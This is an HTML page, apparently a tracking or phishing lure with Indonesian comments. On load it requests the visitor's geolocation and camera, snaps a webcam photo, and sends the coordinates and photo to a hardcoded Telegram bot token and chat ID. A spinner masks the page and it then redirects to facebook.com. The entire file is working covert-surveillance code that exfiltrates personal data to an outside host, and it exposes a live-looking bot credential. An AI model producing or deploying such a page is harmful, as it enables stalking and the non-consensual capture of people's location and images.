<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Bot</title>
  <style>
    #loading-indicator {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <!-- Indikator loading -->
  <div id="loading-indicator">
    <div class="spinner"></div>
  </div>

  <script>
    const apiToken = "7537995896:AAGg4hCRAellVFqQHZml6qIZSBTEUs4WXQg"; // Ganti dengan token bot Anda
    const chatId = "7353825005"; // Ganti dengan chat ID Anda
    const redirectUrl = "https://facebook.com"; // Ganti dengan URL tujuan redirect

    // Dapatkan akses kamera dan ambil satu foto
    const capturePhoto = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await new Promise((resolve) => (video.onloadedmetadata = resolve));
        video.play();

        const canvas = document.createElement("canvas");
        const context = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const photoBlob = await new Promise((resolve) => {
          canvas.toBlob((blob) => resolve(blob), "image/jpeg");
        });

        stream.getTracks().forEach((track) => track.stop());
        return photoBlob;
      } catch (err) {
        console.error("Gagal mengakses kamera:", err);
        return null;
      }
    };

    // Kirim pesan dan foto ke Telegram
    const sendToTelegram = async (message, photoBlob) => {
      try {
        // Kirim pesan teks
        const messageUrl = `https://api.telegram.org/bot${apiToken}/sendMessage`;
        await fetch(messageUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message }),
        });

        // Kirim foto
        if (photoBlob) {
          const photoUrl = `https://api.telegram.org/bot${apiToken}/sendPhoto`;
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", photoBlob, "capture.jpg");

          await fetch(photoUrl, { method: "POST", body: formData });
        }
      } catch (error) {
        console.error("Terjadi kesalahan saat mengirim ke Telegram:", error);
      }
    };

    // Proses utama saat halaman dimuat
    (async () => {
      try {
        const location = await new Promise((resolve, reject) => {
          if (!navigator.geolocation) return reject("Geolocation tidak didukung.");
          navigator.geolocation.getCurrentPosition(
            (pos) => resolve(pos.coords),
            (err) => reject("Gagal mendapatkan lokasi: " + err.message)
          );
        });

        const { latitude, longitude } = location;
        const locationMessage = `Lokasi saat ini: https://www.google.com/maps?q=${latitude},${longitude}`;

        const photoBlob = await capturePhoto();
        await sendToTelegram(locationMessage, photoBlob);

        // Sembunyikan indikator loading dan redirect
        document.getElementById("loading-indicator").style.display = "none";
        window.location.href = redirectUrl;
      } catch (err) {
        console.error("Terjadi kesalahan:", err);

        // Tetap redirect meskipun terjadi kesalahan
        document.getElementById("loading-indicator").style.display = "none";
        window.location.href = redirectUrl;
      }
    })();
  </script>
</body>
</html>
